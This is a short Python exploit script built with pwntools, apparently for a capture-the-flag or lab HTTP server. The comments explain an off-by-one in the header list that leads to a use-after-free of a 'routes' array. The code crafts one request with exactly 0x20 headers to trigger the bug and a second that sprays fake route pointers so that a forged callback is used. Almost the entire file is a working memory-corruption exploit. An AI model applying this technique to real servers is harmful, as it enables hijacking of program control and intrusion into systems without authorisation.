
from pwn import * 

'''
If we got to EXACTLY the length of the amount of headers for a 
response, it creates problems. 

Some of the usage of 'res_headers_lst' only check for NULL and 
NOT the maximum amount. As a result, we can use the pointer AFTER
this to do things. 
In practice, this is the 'routes' array! 

The usage includes an unnecessary free, which creates a UAF on the routes. 
'''
string = "GET /files/hello_world.html" + " HTTP/1.1\r\n"
#string += "Content-Length: %s\r\n" % (len(payload))
string += "Connection:AAA\r\n" # Make a NEW connection after this 
string += "X-Request-Id: BBB\r\n" * 0x1F # Need EXACTLY 0x20 headers to exploit this
string += "\r\n"

print(string) 

string = "GET /files/hello_world.html" + " HTTP/1.1\r\n"

'''
The 'routes' array is a list of pointers to routes. 
To fake this properly, we need to create a FAKE route. 
The KEY is going to be our list of pointers entries in the 
first of the headers.
- 0x110 sized chunk. 
Our VALUE is going to be our FAKE pointer for the entry.
'''
fake_routes = p64(0x55555555d000) * 0x20 # Create a large LIST of pointers to our fake chunk. 

fake_route = "ALL\x00" # Verb 
fake_route += (0x20 - len(fake_route)) * "B" # Filler for the REST of the verb
fake_route += p64(0x55555555d000) # Route string pointer - set to ALL
fake_route += p64(0x55555555d000) # Default callback

crafted_chunks = fake_routes + ":" + fake_route + "\r\n"

#string += "A" * (0x110 - 0x10) + ":" + "B" * 0x200 + "\r\n" # 0x100 bin to get the 'route' chunk
string += crafted_chunks
string += "\r\n"

print(string) 